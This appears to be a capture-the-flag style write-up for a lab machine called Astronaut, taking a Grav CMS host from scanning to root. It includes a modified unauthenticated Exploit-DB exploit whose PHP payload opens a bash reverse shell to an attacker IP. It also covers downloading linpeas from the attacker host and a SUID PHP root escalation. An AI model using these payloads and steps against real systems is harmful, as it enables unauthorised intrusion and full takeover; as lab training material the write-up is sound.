# Astronaut

## Initial access

Ran an automated enumeration scan against the target host.

```
sudo autorecon 192.168.112.12
```

The scan revealed two open ports:

- **22** — SSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0))
- **80** — HTTP (Apache httpd 2.4.41)

Navigated to `http://192.168.112.12` in a browser. The web root presented a directory listing containing a `grav-admin/` directory.

```
http://192.168.112.12/grav-admin/
```

Opening `http://192.168.112.12/grav-admin/` displayed a default Grav CMS installation page with a "Powered by Grav CMS" footer.

Performed directory busting on `http://192.168.112.12/grav-admin/`, which revealed the following paths:

```
http://192.168.112.12/grav-admin/admin
http://192.168.112.12/grav-admin/login
http://192.168.112.12/grav-admin/robots.txt
```

All other subdirectories returned either 403 or 404 responses.

Examined `http://192.168.112.12/grav-admin/robots.txt`:

```
User-agent: *
Disallow: /backup/
Disallow: /bin/
Disallow: /cache/
Disallow: /grav/
Disallow: /logs/
Disallow: /system/
Disallow: /vendor/
Allow: /user/pages/
Allow: /user/themes/
Allow: /user/images/
Allow: /
Allow: *.css$
Allow: *.js$
Allow: /system/*.js$
```

Attempted to log in to the admin panel at `http://192.168.112.12/grav-admin/admin` and the login page at `http://192.168.112.12/grav-admin/login` using default credentials, but all attempts failed.

Searched Exploit-DB for known vulnerabilities in Grav CMS:

```
searchsploit grav
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Apache Gravitino 1.2.1 - SSRF                                                      | multiple/webapps/52641.py
BitDefender GravityZone 5.1.5.386 - Multiple Vulnerabilities                       | linux/webapps/34086.txt
Cobian Backup 11 Gravity 11.2.0.582 - 'Password' Denial of Service (PoC)           | windows/local/50790.py
Cobian Backup Gravity 11.2.0.582 - 'CobianBackup11' Unquoted Service Path          | windows/local/50791.txt
Grav CMS 1.4.2 Admin Plugin - Cross-Site Scripting                                 | php/webapps/42131.txt
Grav CMS 1.6.30 Admin Plugin 1.9.18 - 'Page Title' Persistent Cross-Site Scripting | php/webapps/49264.txt
Grav CMS 1.7.10 - Server-Side Template Injection (SSTI) (Authenticated)            | php/webapps/49961.py
Grav CMS 1.7.48 - Remote Code Execution (RCE)                                      | php/webapps/52402.txt
Grav CMS 2.0.0-beta.2 -  Remote Code Execution                                     | php/webapps/52578.py
Grav CMS 2.0.7 - RCE                                                               | multiple/webapps/52669.py
GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)                 | php/webapps/49973.py
GravCMS 1.10.7 - Unauthenticated Arbitrary File Write (Metasploit)                 | php/webapps/49788.rb
Gravity Board X 1.1 - 'csscontent' Remote Code Execution                           | php/webapps/1510.pl
Gravity Board X 1.1 - CSS Template Unauthorized Access                             | php/webapps/26111.txt
Gravity Board X 1.1 - Login SQL Injection                                          | php/webapps/26106.txt
Gravity Board X 2.0 Beta (Public Release 3) - SQL Injection                        | php/webapps/11583.pl
Gravity Board X 2.0 Beta - SQL Injection / (Authenticated) Code Execution          | php/webapps/8350.txt
Gravity Board X 2.0 Beta - SQL Injection / Cross-Site Scripting                    | php/webapps/5791.txt
Gravity GTD 0.4.5 - Local File Inclusion / Remote Code Execution                   | php/webapps/7344.txt
gravy media CMS 1.07 - Multiple Vulnerabilities                                    | php/webapps/8315.txt
Gravy Media Photo Host 1.0.8 - Local File Disclosure                               | php/webapps/8996.txt
WordPress Plugin Aviary Image Editor Addon For Gravity Forms 3.0 Beta - Arbitrary  | php/webapps/37275.txt
WordPress Plugin Gravity Forms 1.8.19 - Arbitrary File Upload                      | php/webapps/39969.php
----------------------------------------------------------------------------------- ---------------------------------
```

Selected the unauthenticated arbitrary YAML write/update exploit (49973) and mirrored it locally:

```
searchsploit -m 49973
```

Examined the exploit script and modified the payload to deliver a reverse shell. The exploit writes a PHP payload to a YAML configuration file via the Grav scheduler feature; the modified version changes the base64-encoded reverse shell to target the attacker's IP:

```
#Change base64 encoded value with with below command.

#echo -ne "bash -i >& /dev/tcp/192.168.1.3/4444 0>&1" | base64 -w0

payload=b"""/*<?php /**/

file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMy80NDQ0IDA+JjE='));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
```

Modified the exploit to update the target URL and reverse shell listener IP:

```
diff 49973.py 49973_modified.py
14c14
< target= "http://192.168.1.2"
---
> target= "http://192.168.112.12/grav-admin"
16c16
< #echo -ne "bash -i >& /dev/tcp/192.168.1.3/4444 0>&1" | base64 -w0
---
> #echo -ne "bash -i >& /dev/tcp/192.168.45.189/4444 0>&1" | base64 -w0
18c18
< file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMy80NDQ0IDA+JjE='));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
---
> file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4OS80NDQ0IDA+JjE='));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
```

The changes update the target URL to `http://192.168.112.12/grav-admin` and the reverse shell listener IP to `192.168.45.189`.

Ran the modified exploit and caught a reverse shell with penelope:

```
python3 49973_modified.py

# penelope
www-data@gravity:~/html/grav-admin$ whoami
www-data
```

There is no `local.txt` flag on this box.

## Privilege escalation

Uploaded `linpeas.sh` to the target for enumeration. Started an HTTP server on the attacker machine and downloaded the script via `wget`:

```
# Host
python3 -m http.server 9001

ip a
inet 192.168.45.189/24

# Target
www-data@gravity:~/html/grav-admin$ cd /tmp
www-data@gravity:/tmp$ which wget
/usr/bin/wget

www-data@gravity:/tmp$ wget http://192.168.45.189:9001/linux/enum/linpeas.sh
```

Ran `linpeas.sh` to enumerate privilege escalation vectors:

```
www-data@gravity:/tmp$ chmod +x linpeas.sh 
www-data@gravity:/tmp$ ./linpeas.sh
```

The most notable finding was a SUID PHP binary:

```
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
...
-rwsr-xr-x 1 root root 4.6M Feb 23  2023 /usr/bin/php7.4 (Unknown SUID binary!)
```

A SUID PHP binary can be abused to spawn a root shell using the GTFOBins technique for PHP with SUID set. Executed the following command to gain a privileged shell:

```
www-data@gravity:/tmp$ /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"

# whoami
root
```

Retrieved the `proof.txt` flag:

```
# cd /root
# cat proof.txt
86540675c65680e52c0f57b804acb2d9
```
